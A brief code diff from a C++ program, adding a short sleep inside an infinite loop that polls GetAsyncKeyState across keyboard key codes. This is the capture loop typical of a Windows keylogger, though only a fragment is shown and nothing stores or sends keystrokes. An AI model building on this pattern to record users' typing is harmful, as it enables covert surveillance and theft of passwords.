@@ -9,6 +9,7 @@ int main()
 	std::string tmp;
 	while (true)
 	{
+		Sleep(15);
 		for (int i = 8; i <= 190; i++)
 		{
 			if (GetAsyncKeyState(i) == -32767)
